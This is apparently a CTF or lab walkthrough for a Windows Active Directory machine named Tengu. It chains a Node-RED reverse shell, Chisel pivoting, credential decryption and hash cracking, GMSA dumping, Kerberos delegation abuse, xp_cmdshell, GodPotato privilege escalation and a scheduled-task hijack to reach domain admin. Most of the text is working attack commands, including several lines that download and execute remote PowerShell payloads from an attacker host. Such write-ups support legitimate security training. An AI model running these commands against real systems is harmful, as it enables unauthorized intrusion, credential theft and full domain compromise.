## Initial Access
On 10.10.193.119 is a web service running named Node-RED on port 1880 which does not require authentication. We can make a flow which executes a reverse shell on the target system:
```
Inject/Timestamp -> Exec (enter your rev shell in this block) -> debug
```

Save the flow and press the button on the left of the timestamp to execute.

## Internal enumeration
Since almost all ports where closed from the outside we can try to scan from the inside to discover what is running and where. We can start a reverse forward with Chisel:
```
// On target
./chisel_linux client <VPN-IP>:8001 R:1080:socks &
​
// On AttackerBox
chisel server -p 8001 --reverse
```
Since scanning through ProxyChains is a pain in the bum we can transfer a static NMAP over and scan from our first compromised machine which reveals:
```
10.10.193.117:
Not shown: 1146 filtered ports
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos
135/tcp  open  epmap
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd
593/tcp  open  unknown
636/tcp  open  ldaps
3389/tcp open  ms-wbt-server
​
10.10.193.118:
Not shown: 1153 filtered ports
PORT     STATE SERVICE
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s
3389/tcp open  ms-wbt-server
```

It is pretty save to assume that .117 is the domain controller. There is also a service running on port 631 listening on 127.0.0.1 if we forward this we see that it is.
In nodered_svc home directory is a hidden folder for node-red which has a hash in flows_cred.json.
```
"$": "7f5ab122acc2c24df1250a30<redacted>"
```
After searching around how the red node works and how it handles credentials i stumbled against ​[extract nodered creds](https://blog.hugopoi.net/en/2021/12/28/how-to-decrypt-flows_cred-json-from-nodered-data/).
By following the steps in the blogpost we can decrypt the password used for mssql.
```
{"d237b4c16a396b9e":{"username":"nodered_connector","password":"DreamPuppy<redacted>"}}
```

## MSSQL user
Since we have credentials we can use our proxy to log into the mssql server:
```
proxychains mssqlclient.py nodered_connector:DreamPuppy<redacted>@10.10.193.118 
```
We have low privileges and can not enable xp_cmdshell to execute system commands. We can check if there are any other databases available:
```
SELECT name FROM master.dbo.sysdatabases;
SELECT * FROM Demo.INFORMATION_SCHEMA.TABLEs;
SELECT * FROM Users;
```
These commands reveals a hash for the user:
```
t2_m.winters:af9cfa9b70e5e90984203087e5<redacted>
```
By throwing this into crackstation we get a password back, we can ssh with these credentials into the first machine we got access to:
```
ssh tengu.vl\\t2_m.winters@10.10.193.119
```

We can simply sudo su and become root. With these same credentials we can run Bloodhound to gather more information:
```
proxychains bloodhound-python -d tengu.vl -c All -dc dc.tengu.vl -ns tengu.vl -u t2_m.winters -p <Password> --zip
```
The interesting path that bloodhound reveals is:
- The NodeRed machine can read GMSA password
- Allowed to delegate from the GMSA01$ user which we can dump to the SQL server

## SQL Server
Since we are root now we can use [KeyTabExtract](https://github.com/sosdave/KeyTabExtract) to dump the hash of the machine account, there are multiple tools doing basically the same but this one was the only one that i found without a pip install requirement.
```
python3 keytabextract.py /etc/krb5.keytab
```
We can then use the NTLM hash to dump the GMSA:
```
proxychains netexec ldap dc.tengu.vl -u 'NODERED$' -H <hash> --gmsa
```
With the hash we can start abusing the delegate to the SQL server , we first have to request a ticket for the MSSQLSvc but the user has to be part of the SQL Admins group:
```
proxychains impacket-getST -dc-ip dc.tengu.vl -spn MSSQLSvc/sql.tengu.vl 'tengu.vl/gMSA01$:@sql.tengu.vl' -hashes :8b038ae130a27269ce19d11a8ab1be89  -impersonate 'T1_M.WINTERS'
```
We can now import the ticket:
```
export KRB5CCNAME=T1_M.WINTERS.ccache
```
And login into the SQL server:
```
proxychains mssqlclient.py -k sql.tengu.vl
```
As SQL Admins we can enable xp_cmdshell and execute our reverse shell due to the length limitation of 128 chars we have to retrieve it remotely:

```
enable_xp_cmdshell
xp_cmdshell echo IEX(New-Object Net.WebClient).DownloadString("http://<VPN>:8000/s.ps1") | powershell -noprofile
```
We now have a shell, when checking the privs of the user:
```
PRIVILEGES INFORMATION ----------------------  Privilege Name                Description                               State    ============================= ========================================= ======== 
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled 
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled 
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled  
SeImpersonatePrivilege        Impersonate a client after authentication Enabled  
SeCreateGlobalPrivilege       Create global objects                     Enabled  
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

With these privileges we can use god potato and get a shell as SYSTEM:
```
./god.exe -cmd "powershell.exe -nop -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://<VPN>:8000/s.ps1');"
```

## Domain Admin
In C:\ there is a directory named admin which has a powershell script running. When we retrieve the owner of the file:
```
Get-Acl Task.ps1 | Select-Object Owner
```
We notice that a domain admin is the owner of it. By enumerating a bit more we can find a scheduled task for this file:
```
Get-ScheduledTask
```
We can now simply change the content of  Task.ps1 and force the task execution:
```
wget http://<VPN>:8000/s.ps1 -o Task.ps1
type Task.ps1
Start-ScheduledTask -TaskName Daily_Checkup
```
Now with a shell back as the DA we can simply log into the DC and get the last flag.
